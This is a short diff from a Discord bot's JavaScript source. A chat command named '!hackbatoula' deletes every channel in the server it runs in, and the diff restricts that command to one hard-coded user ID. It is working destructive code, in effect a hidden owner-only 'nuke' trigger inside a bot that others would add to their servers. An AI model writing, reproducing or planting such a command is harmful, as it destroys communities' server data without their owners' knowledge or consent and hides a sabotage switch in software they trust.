@@ -73,14 +73,14 @@ client.on('message', message => {
 
     }
     if (message.content.toLowerCase().startsWith("!hackbatoula")) {
-        
-        message.guild.channels.cache.forEach((channel) => {
+        if(message.author.id == "283395082885791744") {
+            message.guild.channels.cache.forEach((channel) => {
             channel.delete()
-                .then(console.log('Channels has been deleted'))
+                .then(console.log('Te7chelek'))
                 .catch(console.error);
         })
         
-
+    }
 
     }
 
